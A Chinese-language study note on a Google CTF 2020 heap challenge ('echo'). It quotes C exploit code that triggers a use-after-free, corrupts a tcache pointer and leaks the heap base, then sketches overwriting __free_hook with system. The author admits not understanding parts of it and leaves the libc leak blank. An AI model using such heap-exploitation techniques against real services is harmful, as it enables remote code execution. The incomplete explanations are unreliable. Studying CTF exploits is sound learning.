参考：

https://github.com/yytgravity/Daily-learning-record/blob/master/google%20ctf%20wp/echo/Readme.md

http://blog.redrocket.club/2020/08/30/google-ctf-quals-2020-echo/



```c
// fill up remaining chunks 1 to 9
    //填充剩余1-8个块
    for (i = 1; i < 9; i++) {
        writeall(conns[i], chunk, 0x10000u >> i);
        yield();
    }
```

为什么要右移？（似乎是）填充由字符串重新分配引起的漏洞（没看懂

但是后面leak libc的时候利用到了

## uaf漏洞利用方式

```c
#define yield() usleep(1000)

int conn() {
    //open connection on localhost:21337
}

int main() {
    int c1, c2;
    
    c1 = conn();
    yield();
    c2 = conn();
    write(c1, "AAAA...", 0x20);
    write(c2, "BBBB...", 0x20);
    yield();
    
    write(c2, "uafw", 4);
    close(c1);
    yield();
    
    return 0;
}
```

用这个代码会实现uaf，第三个对于c2的write会写到c1去，似乎是因为析构会将两个fd的chunk指针交换



## leak heap

- 泄漏heap的地址主要依靠glibc2.29引入的key指针，我们都知道它指向堆开头的tcache_perthread_struct结构的地址，我们将他泄漏就可以得到堆基址。

操作：

1. 申请0x10000大小的大chunk（主要保证之后低地址覆盖时可以正好落入大chunk）
2. 申请三个chunk
3. free chunk A，chunk B，然后利用uaf把chunk B的fd指针的第一个字节修改为空
4. 申请chunk C，chunk D，chunk C=chunk B，因为修改了字节，所以chunk D大概率在之前申请的大chunk里
5. free掉chunk D，然后输出大chunk，在里面即可找到heap基址

```c
// allocate 3 0x30 chunks, A chunk right behind the 0x10000 area
    //分配三个0x30的块
    write(conns[13], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x20);
    yield();
    write(conns[14], "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", 0x20);
    write(conns[15], "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", 0x20);
    yield();

    // close A buffer, places pointer to it in tcache freelist head
    //关闭A，将指向它的指针放在tcache的freelist head中
    close(conns[13]);
    yield();

    // bug: free B, and uaf write two nullbytes into free'd B memory.
    // partially overwrites tcaches next pointer pointing to A.            
    write(conns[15], "\0", 1);
    close(conns[14]);
    yield();

    // allocate two 0x30 chunks, Y is likely to be placed inside the 0x10000 area
    conns[13] = conn();
    conns[14] = conn();
    write(conns[13], "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x20);
    yield();
    write(conns[14], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 0x20);
    yield();

    // free Y chunk, writes heap base into 0x10000 area
    close(conns[14]);
    yield();

    // read the buffer back in by sending '\n'
    write(conns[0], "\n", 1);
    // skip the hello message, linus would insult me for writing this code
    do {
        read(conns[0], chunk, 1);
    } while(*chunk != '\n');
    readall(conns[0], chunk, 0x10000);

    // search for heap address
    size_t *leak = memmem(chunk, 0x10000, "YYYYYYYY", 8);
    if (!leak) {
        puts("heapbase not found :(");
        exit(0);
    }
    size_t heapbase = leak[-1];
    printf("heapbase located at: 0x%lx\n", heapbase);
```



## leak libc

说实话 没看太懂...



## get flag

还是利用uaf，获取free_hook的空间

用libc.system覆盖掉它

在chunk里写下想执行的语句，执行即可
